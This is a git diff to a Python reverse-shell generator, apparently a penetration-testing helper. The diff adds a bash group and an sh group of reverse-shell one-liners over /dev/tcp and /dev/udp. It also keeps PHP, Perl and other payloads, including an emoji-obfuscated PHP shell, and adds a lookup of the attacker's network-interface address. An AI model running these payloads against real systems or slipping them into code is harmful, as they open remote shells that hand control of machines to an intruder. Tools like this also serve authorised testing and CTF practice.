@@ -1,22 +1,27 @@
+#!/usr/bin/env python3
 import argparse
-import sys
-import pyperclip
 from base64 import b64encode
 from importlib.util import find_spec
 from urllib.parse import quote
+from psutil import net_if_addrs
+from sys import argv
+from pyperclip import copy
 
-if not find_spec("pyperclip"):
-    print("[!] Looks like you don't have pyperclip installed, it is required to run the script\npip3 install pyperclip")
-    exit(0)
+requirements = ("pyperclip","psutil")
+for library in requirements:
+    if not find_spec(library):
+        print(f"[!] Looks like you don't have {library} installed.\npip3 install {library}")
+        exit(0)
 
-available_shells = '| BASH | NC | NCAT | RUSTCAT | PERL | PHP | WINDOWS | POWERSHELL | PYTHON | RUBY | SOCAT | NODEJS | TELNET | ZSH | LUA | GOLANG | AWK |'
+available_shells = '| BASH | SH | NC | NCAT | RUSTCAT | PERL | PHP | WINDOWS | POWERSHELL | PYTHON | RUBY | SOCAT | NODEJS | TELNET | ZSH | LUA | GOLANG | AWK |'
 
 def usage():
+    global available_shells
     print("\n[!] Args with a '*' are optional")
-    print(f"Usage: python3 {sys.argv[0]} -s <shell-type> -lh <lhost> -lp* <lport> -enc*  <encode-type>\n\nAvailable shells:")
+    print(f"Usage: python3 {argv[0]} -s <shell-type> -lh <lhost> -lp* <lport> -enc*  <encode-type>\n\nAvailable shells:")
     print(available_shells+"\n")
     print("To list available revshells add =list")
-    print(f"E.g => python3 {sys.argv[0]} --shell netcat=list\n")
+    print(f"E.g => python3 {argv[0]} --shell netcat=list\n")
 
 parser = argparse.ArgumentParser(usage=argparse.SUPPRESS,add_help=False)
 parser.add_argument('-lh','--lhost',metavar='')
@@ -33,8 +38,8 @@ if args.help:
 def results(revshell):
     print("[Shell name] -",subgroup)
     print("Your shell =>",revshell)
-    pyperclip.copy(revshell)
-    print("[!] Copied to clipboard")
+    copy(revshell)
+    print("[!]Copied to clipboard")
 
 def encodingTable(command):
     if encode == 'b64' or encode == 'base64':
@@ -75,7 +80,14 @@ def craftingTable(shell):
 
 shells = {
     'bash':{
-        '-i':''' sh -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
+        'gurgui':''' bash -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
+        '196':''' 0<&196;exec 196<>/dev/tcp/LHOST/LPORT; bash <&196 >&196 2>&196 ''',
+        'read line':''' exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done ''',
+        '5':''' bash -i 5<> /dev/tcp/LHOST/LPORT 0<&5 1>&5 2>&5 ''',
+        'udp':''' bash -i >& /dev/udp/LHOST/LPORT 0>&1 '''
+    },
+    'sh':{
+        'gurgui':''' sh -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
         '196':''' 0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196 ''',
         'read line':''' exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done ''',
         '5':''' sh -i 5<> /dev/tcp/LHOST/LPORT 0<&5 1>&5 2>&5 ''',
@@ -100,7 +112,7 @@ shells = {
         'no_sh':''' perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' '''
     },
     'php':{
-        'emoji':''' php -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = "localhost";$ð» = 4444;$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);' ''',
+        'emoji':''' php -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = "localhost";$ð» = LPORT;$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);' ''',
         'exec':''' php -r '$sock=fsockopen("LHOST",LPORT);exec("sh <&3 >&3 2>&3");' ''',
         'shell_exec':''' php -r '$sock=fsockopen("LHOST",LPORT);shell_exec("sh <&3 >&3 2>&3");' ''',
         'system':''' php -r '$sock=fsockopen("LHOST",LPORT);system("sh <&3 >&3 2>&3");' ''',
@@ -171,11 +183,6 @@ if shell == 'listall':
 if "netcat" in shell:
     shell = shell.replace("netcat","nc")
 
-lhost = args.lhost
-lport = args.lport if args.lport else '4444'
-encode = args.encode if args.encode else None
-subgroup = None
-
 if '=' in shell:
     subgroup = shell.split('=')[1]
     shell = shell.split('=')[0]
@@ -188,12 +195,21 @@ if '=' in shell:
         print(f"[!] There isn't any {shell} revshell called {subgroup}")
         exit(0)
 
-if not args.lhost:
-    usage()
+if shell.upper() not in available_shells:
+    print(f"[!] There isn't a shell called {shell}\nAvailable shells: {available_shells}")
     exit(0)
 
-if shell.upper() not in available_shells:
-    usage()
+if not args.lhost:
+    print("[!] Lhost must be specified")
     exit(0)
+
+try:
+    lhost = net_if_addrs()[args.lhost][0].address
+except:
+    lhost = args.lhost
+
+lport = args.lport if args.lport else '4444'
+encode = args.encode if args.encode else None
+subgroup = None
 
 craftingTable(shell)
